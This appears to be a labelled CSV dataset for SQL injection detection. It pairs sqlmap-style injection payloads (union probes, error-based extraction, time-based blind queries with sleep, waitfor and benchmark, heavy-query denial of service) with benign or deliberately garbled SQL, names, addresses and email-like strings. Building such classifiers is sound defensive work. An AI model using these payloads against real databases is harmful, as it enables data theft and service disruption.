Query,Label
select sleep  (  5  )   and   (  'labj'  =  'labj,1
-4803%'   )    )    or 8571  =  8571--,1
SELECT * FROM should WHERE Price NOT BETWEEN 10 AND 20,0
perpi izurrieta,0
SELECT * FROM safe WHERE wooden BETWEEN shorter09/01/1996exercise AND fireplace15/31/1996information,0
"-4798""   )    )     )   union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#",1
select * from users where id  =  1 or \<1 or 1  =  1 -- 1,1
josee,0
SELECT * FROM operation WHERE nothing BETWEEN '1996-07-01' AND '1996-07-31',0
darby,0
1   )    )    as gocb where 4335  =  4335,1
SELECT COUNT ( DISTINCT breeze )  FROM mean,0
DELETE FROM hill WHERE aboard = 'opposite',0
SELECT sunlight,0
meredith,0
"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",1
o.toole,0
"1"" union all select null,null,null,null,null,null,null,null--",1
1 uni/**/on select all from where,1
"-6357""  )   union all select 9767,9767,9767,9767,9767,9767,9767,9767,9767#",1
"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
SELECT * FROM label WHERE against = 'trade'  AND  ( heard = 'biggest' OR flow = 'simple' ) ,0
"1'   )    )    as jmnw where 6496  =  6496 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
-9191'  )   as qtvm where 2838  =  2838 or   (  8459  =  8459  )  *4906--,1
"1'+  (  select ocvc where 6981  =  6981 union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT equal ( s )  FROM card FULL OUTER JOIN,0
gater9,0
"1""  )   where 4822  =  4822 union all select null,null,null,null,null,null,null,null,null,null--",1
" SELECT column_name ( s )  FROM together,summer",0
p870en538r7,0
SELECT * FROM sure WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM cookies WHERE pack = 'share' LIMIT 3,0
t1iesti70,0
SELECT AVG ( Price ) FROM physical,0
"SELECT UCASE ( ""SQL Tutorial is FUN!"" ) ; ",0
"1""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""lynw"" like ""lynw",1
1' waitfor delay '0:0:5' and 'dtej' like 'dtej,1
SELECT * FROM wrapped WHERE NOT ability = 'brick'  AND NOT thing = 'doll',0
SELECT AVG ( primitive ) FROM nobody,0
fe4r0g6ent8,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  9348  =  9348",1
SELECT * FROM  ( SELECT bag FROM until ) ,0
"1""  )   as aifd where 5962  =  5962",1
DELETE FROM whatever,0
" select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",1
"1%' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and '%'  =  '",1
DELETE FROM hunter,0
waitfor delay '0:0:5'  )  +',1
SELECT future ( s )  FROM laid SELECT tight FROM writing,0
cabral_crowther@frioelectric.br,0
SELECT TOP 50 PERCENT * FROM leaf SELECT * FROM store FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM wife,0
SELECT DISTINCT circle FROM activity,0
"-1254"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ",1
"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",1
SELECT * FROM complete 3,0
"1' in boolean mode  )   union all select null,null,null,null#",1
"1%'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",1
chaurett,0
8.32456E+15,0
1'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'uqfs'  =  'uqfs,1
michalowski@lodgeinmadrid.mu,0
veracruz,0
shiomi@errebebe.ug,0
SELECT * FROM enemy  WHERE bark NOT LIKE '[body]%',0
8.81212E+15,0
"-2102' where 3644  =  3644 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"-2852%'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"-3703""   )    )     )   union all select 3293,3293,3293,3293,3293,3293,3293,3293,3293,3293#",1
SELECT * FROM Customers  WHERE Country = 'Germany' OR Country = 'Spain';,0
laparra pinazo,0
"1%"" or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1
"-7635"" union all select 1284,1284,1284,1284,1284,1284#",1
1'   )    )     )   and 7533  =  7533 and    (    (     (  'txex'  =  'txex,1
SELECT TOP 50 PERCENT * FROM attack,0
"1"" and sleep  (  5  )  #",1
bat3an,0
SELECT * FROM living WHERE science = 'seen' LIMIT 3,0
0a0t4d2r,0
SELECT * FROM short 3 SELECT * FROM courage,0
-7859  )   as ipdg where 4413  =  4413 or 9323  =  9323#,1
"1""  )   as awdg where 9512  =  9512",1
SELECT whole ( s )  FROM dry UNION ALL,0
brot calderer,0
SELECT total ( s )  FROM gold FULL OUTER JOIN,0
"-2298%' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"  SELECT lot AS term, gulf AS [tax]  FROM upon",0
"   SELECT Employees.accident, COUNT ( Orders.rhythmID )  AS meantFROM    ( OrdersINNER JOIN division ON Orders.stripID  =  Employees.takenID ) ",0
2238,0
1'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  'ujds'  =  'ujds,1
faustino cavadas 162 6-a,0
"  UPDATE essential SET hour =  'must', City =  'attempt' WHERE hidden =  border",0
1 where 8393  =  8393,1
"   SELECT COUNT ( pond ) , sale FROM mission BY atmosphere",0
"1'||  (  select 'mdqc' where 4533  =  4533 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"   SELECT dress, title+ ', ' + dish+ ' ' + seed+ ', ' + dog AS pipe  FROM frighten",0
1' and 2908  =  8067--,1
1'+  (  select 'yyyn' where 5395  =  5395,1
1'+  (  select wpkh where 5842  =  5842,1
SELECT * FROM steady WHERE dug BETWEEN entire09/01/1996several AND body15/31/1996union,0
"1'  )   and elt  (  7554  =  6257,6257  )   and   (  'bpzm'  =  'bpzm",1
SELECT * FROM invented WHERE Price NOT BETWEEN 10 AND 20,0
pruja lantadilla,0
nagyszeder.kehoe@creacionesacampada.es,0
SELECT * FROM both 3 SELECT * FROM task,0
iza,0
-4947' order by 1#,1
SELECT AVG ( outside ) FROM feel SELECT SUM ( breakfast ) ,0
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1
"-9574%'   )    )    union all select 5645,5645,5645,5645,5645,5645,5645--",1
SELECT * FROM couple WHERE herself  BETWEEN 10 AND 20,0
SELECT case ( s )  FROM whom LEFT JOIN,0
DELETE FROM thou WHERE needs = 'force',0
georges,0
"  SELECT Orders.particlesrID, Employees.definition, Employees.only FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.containID ORDER BY Orders.railroadID",0
"-7743"" or 9323  =  9323#",1
10560589r,0
"-4889""   )    )    as vvuo where 8060  =  8060 or   (  8459  =  8459  )  *4906--",1
"-3169"" order by 1#",1
"1',  (  select   (  case when   (  8640  =  8640  )   then   (  ascii  (  regexp_substring  (  repeat  (  right  (  char  (  8640  )  ,0  )  ,500000000  )  ,null   )    )     )   else 8640/  (  select 0 from information_schema.system_users  )   end  )   from information_schema.system_users  )  --",1
SELECT * FROM written WHERE partly = 'widely' FETCH FIRST 3 ROWS ONLY,0
"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'hllf'  =  'hllf",1
junette6,0
SELECT * FROM lamp,0
1  )   as msat where 1267  =  1267,1
"1""  )   and 8677  =  9054#",1
1'   )    )    as fcjk where 7755  =  7755,1
40542,0
SELECT * FROM particularly WHERE field BETWEEN up09/01/1996eat AND interest15/31/1996branch,0
"  SELECT MONTHNAME ( ""2017-06-15"" ) ;",0
"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
"1%'   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"-9008'  )   union all select 4976,4976,4976,4976#",1
"   SELECT south, president+ ', ' + heat+ ' ' + fact+ ', ' + finger AS which  FROM leader",0
pelamen,0
1   )    )    as bsvo where 3605  =  3605,1
SELECT * FROM glass  WHERE sat = blanket,0
SELECT * FROM promised WHERE shout BETWEEN black09/01/1996nearly AND jungle15/31/1996move,0
"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1
select   (  case when   (  5142  =  6855  )   then 5142 else 5142*  (  select 5142 from mysql.db  )   end  )  #,1
rossenberck,0
"  SELECT Orders.tobaccorID, Employees.single, Employees.die FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.whoseID ORDER BY Orders.bottleID",0
"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT * FROM handsome FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM over,0
4089,0
45641,0
"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",1
"  SELECT fallenID AS ID, certain AS stay FROM supply",0
SELECT * FROM happened WHERE carefully BETWEEN '1996-07-01' AND '1996-07-31',0
"1'  )   where 3262  =  3262 union all select null,null,null,null,null,null,null,null,null,null#",1
-1188   )    )    union all select 4711--,1
select   (  case when   (  3444  =  8424  )   then 3444 else 3444*  (  select 3444 from information_schema.character_sets  )   end  )  #,1
SELECT cut ( s )  FROM copper SELECT distant FROM cost,0
SELECT * FROM closely FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sum,0
SELECT * FROM nest WHERE attack = 'paper',0
SELECT * FROM jar WHERE trail = 'structure' FETCH FIRST 3 ROWS ONLY,0
desnuda,0
terrs triola,0
76156835v,0
SELECT * FROM  ( SELECT wrapped FROM green ) ,0
16452,0
"1%""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""%""  =  """,1
"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",1
"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'jhxh'  =  'jhxh",1
SELECT pilot ( s )  FROM told,0
"  SELECT pleasant,excited,spend FROM arm LEFT JOIN Orders ON get.winID =  rice.there ORDER BY community.work",0
12,0
darcy@google-movil.dz,0
rodionova@movil-google.ga,0
SELECT TOP 50 PERCENT * FROM seed,0
marlet esparraguera,0
SELECT COUNT ( fierceID ) FROM safety,0
"   SELECT zero,plenty,dress,temperature,nails     (  (  cotton JOIN where ON opportunity.bag =  similar.grass )   INNER JOIN coatON Orders.caught =  shot.gooseID ) ",0
"1  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT * FROM excited WHERE class BETWEEN '1996-07-01' AND '1996-07-31',0
"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  # usus",1
"  SELECT bowID AS ID, wheat AS flower FROM park",0
"1""  )   as ucex where 5148  =  5148 order by 1#",1
"1   )    )    as myyh where 5116  =  5116 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'bxnn'  =  'bxnn",1
xixian,0
"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""jcgh""  =  ""jcgh",1
if  (  6624  =  4232  )   select 6624 else drop function xyyt--,1
SELECT AVG ( mountain ) FROM science SELECT SUM ( visit ) ,0
pechur@spainbareback.fm,0
"  SELECT POSITION ( ""3"" IN ""W3Schools.com"" )  AS MatchPosition;",0
1'   )    )     )   and 9198  =  9198--,1
"  SELECT dangerous,thin,leaving FROM cow LEFT JOIN Orders ON chamber.wireID =  coast.needle ORDER BY eat.could",0
SELECT AVG ( himself ) FROM tip SELECT SUM ( finger ) ,0
SELECT * FROM beginning,0
SELECT * FROM straight FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM travel,0
SELECT * FROM cut,0
FROM  ( SELECT DISTINCT aware FROM mostly ) ,0
FROM  ( SELECT DISTINCT stranger FROM managed ) ,0
SELECT bat ( s )  FROM sort UNION,0
palmieri layi,0
1'+  (  select somn where 8636  =  8636 rlike sleep  (  5   )    )   +',1
erhard@miplat.il,0
apretn,0
select sleep  (  5  )   and    (    (     (  'qjsc'  =  'qjsc,1
1  )   where 7050  =  7050,1
"alqueria de coca 38,",0
calle villa de andorra 36 9?b,0
solania,0
SELECT AVG ( base ) FROM since SELECT SUM ( smallest ) ,0
"-6928""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""mxhr"" like ""mxhr",1
SELECT * FROM bear WHERE standard  BETWEEN 10 AND 20,0
"1""   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""bcxh"" like ""bcxh",1
japan,0
1  )   as dlkh where 6179  =  6179 and 9198  =  9198--,1
SELECT exchange,0
SELECT * FROM  ( SELECT drove FROM check ) ,0
"INSERT INTO what  ( who, score, separate )  VALUES  ( 'duty', 'dirty', 'turn' )  ",0
SELECT tax FROM missing,0
san bartolom,0
SELECT CEILING ( 25.75 ) ;,0
SELECT * FROM clear  WHERE continued = how,0
d'amico urrea,0
8.08498E+15,0
"-5732'  )   union all select 7614,7614,7614,7614--",1
SELECT neighbor ( s )  FROM wide UNION ALL,0
capella gorrn,0
"1'  )   union all select null,null,null,null,null#",1
chopel@restauranteslaespadaa.bg,0
"1""  )   as nraw where 7984  =  7984 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
d.antoni,0
" select * from users where id  =  1.%@ union select 1,version  (    )   -- 1",1
"1"" where 9756  =  9756",1
"1  )   where 8630  =  8630 union all select null,null--",1
"   SELECT uncle, studying, jumpFROM for WHERE from  IS NOT NULL",0
c96reveidil5,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",1
1' and   (  3435  =  7210  )  *7210 and 'lxxt'  =  'lxxt,1
SELECT * FROM flight WHERE becoming BETWEEN 'copper' AND 'yard',0
SELECT * FROM ear WHERE through NOT LIKE 'sky%',0
"1%""   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  ""%""  =  """,1
SELECT AVG ( Price ) FROM stream,0
SELECT * FROM compare WHERE journey = 'improve'  AND City = 'trick',0
SELECT before FROM know UNION SELECT fifty FROM learn ORDER BY every,0
SELECT TOP 3 * FROM Customers;  SELECT * FROM CustomersLIMIT 3;SELECT * FROM Customers,0
SELECT COUNT ( whose ) FROM several,0
SELECT AVG ( phrase ) FROM ahead SELECT SUM ( related ) ,0
5.15574E+15,0
"1   )    )    as rsnb where 3168  =  3168 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
42142,0
6105,0
1'  )   and 3560  =  5467--,1
"INSERT INTO wrong ( taste, upward, daughter, develop, word, very )  VALUES  ( 'face', 'aid'. dance', 'zero', 'sit', 'worth', 'could' )  ",0
"-3411'   )    )     )   union all select 3185,3185,3185,3185,3185,3185,3185,3185--",1
decacque,0
2759,0
SELECT MIN ( report )  AS man FROM provide,0
SELECT * FROM mountain WHERE block BETWEEN modern09/01/1996dollar AND come15/31/1996love,0
SELECT TOP 50 PERCENT * FROM yellow,0
1 and 7533  =  7533# absp,1
6.25662E+15,0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3141' LIMIT 1,0
SELECT sing ( s )  FROM engineer FULL OUTER JOIN,0
"  SELECT * FROM anyway WHERE sheep IN  ( 'gulf', 'silly', 'fill' )  ",0
SELECT * FROM till  WHERE certain = leaf,0
SELECT AVG ( earn ) FROM goose SELECT SUM ( stick ) ,0
SELECT far ( s )  FROM hold,0
"-4035' union all select 9540,9540,9540,9540,9540,9540,9540,9540,9540,9540--",1
5.67192E+14,0
di rado elejalde,0
1   )    )    as goar where 2405  =  2405 and 5927  =  9731--,1
SELECT * FROM transportation WHERE raise = 'unusual' LIMIT 3,0
"1""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""zlwb""  =  ""zlwb",1
"pasaje magistrado salvador barbera 136,",0
"""   )    )    or sleep  (  __TIME__  )    =  """,1
"  SELECT * FROM glass WHERE topic NOT IN  ( 'tell', 'mouth', 'typical' )  ",0
cister grandi,0
-2604   )    )    as sekb where 6897  =  6897 or 1000  =  7683,1
hanlon@importaproductosespaoles.cs,0
"   SELECT Employees.shown, COUNT ( Orders.massageID )  AS soapFROM    ( OrdersINNER JOIN work ON Orders.biggerID  =  Employees.tieID ) ",0
hoefer.tabuyo@gopersonalfitness.nz,0
garladora,0
alysia,0
SELECT were ( s ) FROM potatoes INNER JOIN,0
santaniello_tabernero@enfuerteventura.com.ni,0
"1""   )    )    as wooq where 7671  =  7671 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 299801 )  ORDER BY meta_id ASC",0
1 where 4003  =  4003 union all select null--,1
SELECT AVG ( feel ) FROM lion,0
" SELECT * FROM magnet ORDER BY author, rush",0
"  SELECT SUBTIME ( ""2017-06-15 10:24:21.000004"", ""3:2:5.000001"" ) ;",0
4.79638E+15,0
"INSERT INTO highway  ( cheese, age, pale )  VALUES  ( 'gun', 'mix', 'fast' )  ",0
"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",1
SELECT TAN ( -3 ) ;,0
"-4513""   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""gytb""  =  ""gytb",1
FROM  ( SELECT DISTINCT basket FROM usual ) ,0
denice,0
WHERE EXISTS  ( SELECT ProductName FROM   Products WHERE Products.SupplierID  =  Suppliers.supplierID AND Price  =  22 ) ;,0
"1""  )   where 3390  =  3390",1
lazure,0
"el provencio, 6 8f",0
maisa,0
SELECT * FROM shelf WHERE ever BETWEEN '1996-07-01' AND '1996-07-31',0
"   SELECT earlier, few+ ', ' + hospital+ ' ' + direction+ ', ' + rich AS arrow  FROM higher",0
SELECT * FROM choose WHERE anyway NOT LIKE 'path%',0
1'   )    )    as cpwx where 5378  =  5378 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmy""  =  ""twmy",1
"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'cimm' like 'cimm",1
SELECT * FROM nature 3,0
56876281h,0
3625,0
7387,0
"   SELECT COUNT ( along ) , operation FROM seems BY middle",0
"1%'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   '%'  =  '",1
1'  )   and 8404  =  8651#,1
SELECT * FROM imagine WHERE these = 'goes' FETCH FIRST 3 ROWS ONLY,0
5.56439E+15,0
rillo de gallo,0
"1'||  (  select 'ctgs' where 6809  =  6809 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"SELECT * FROM smoke WHERE organization BETWEEN ""its"" AND    ""leave""",0
"azorin, 167",0
tardguila,0
1' where 8099  =  8099,1
-6548 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- rlda,1
"1""   )    )    rlike sleep  (  5  )   and    (    (   ""fzlr""  =  ""fzlr",1
SELECT UPPER ( CustomerName )  AS UppercaseCustomerName FROM Customers;,0
SELECT COUNT ( pick ) FROM stop,0
SELECT * FROM building WHERE shallow = 'aloud' FETCH FIRST 3 ROWS ONLY,0
"   SELECT evening,disappear,planet,pony,plain     (  (  ability JOIN teeth ON beauty.stopped =  high.duty )   INNER JOIN volumeON Orders.bite =  meant.watchID ) ",0
1'   )    )     )   and 4069  =  8786 and    (    (     (  'eftr'  =  'eftr,1
12230,0
SELECT * FROM famous WHERE enter NOT LIKE '[song]%',0
vallart casabella,0
"calle andres mellado, 83, 12-d",0
583opi4,0
"1'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"-6186' in boolean mode  )   union all select 2990,2990,2990#",1
SELECT Count ( * )  AS ourselves,0
fabrelle,0
"-9136'  )   or make_set  (  9354  =  9354,7185  )  ",1
dular,0
c/ guillen santacilla 94,0
1'||  (  select 'goen' from dual where 8586  =  8586,1
piggott@firstchoicecoffee.gq,0
1  )   rlike   (  select   (  case when   (  8488  =  1270  )   then 1 else 0x28 end   )    ) ,1
villanueva gualano,0
tridente,0
SELECT * FROM me FETCH FIRST 3 ROWS ONLY,0
SELECT TOP 50 PERCENT * FROM previous SELECT * FROM sale FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM judge,0
"  UPDATE tribe SET support =  'wire', City =  'flat' WHERE duty =  him",0
SELECT * FROM master  WHERE space = graph,0
"1""  )   as oztl where 6655  =  6655 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
rodis-ryan@colorprint.info,0
"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",1
SELECT * FROM hill WHERE mother = 'firm'  AND City = 'ate',0
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1
valverde de los arroyos,0
"1""   )    )    waitfor delay '0:0:5'--",1
3748ny,0
"  SELECT rock,pretty FROM fruit WHERE country = 'stared' UNION SELECT naturally, most FROM least",0
SELECT food ( s )  FROM evening UNION,0
SELECT Count ( * )  AS army,0
SELECT tr.object_id FROM wp_term_relationships AS tr INNER JOIN wp_term_taxonomy AS tt ON tr.term_taxonomy_id  =  tt.term_taxonomy_id WHERE tt.taxonomy IN  ( 'nav_menu' )  AND tt.term_id IN  ( '715' )  ORDER BY tr.object_id ASC,0
passatge de manyer 105,0
-6100'  )   as kvfc where 2377  =  2377 or 6872  =  6872--,1
1' in boolean mode  )   union all select null--,1
"-5616""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""hdrb"" like ""hdrb",1
l1b6855ca30e,0
livio,0
SELECT * FROM planet,0
"1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  3294  =  3294",1
SELECT * FROM give WHERE ability NOT LIKE '[dropped]%',0
radresa aja,0
elnore,0
"1 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
a' or 'a'   =   'a,1
5013,0
"-7499%""  )   union all select 1893,1893,1893,1893,1893#",1
alh4a3,0
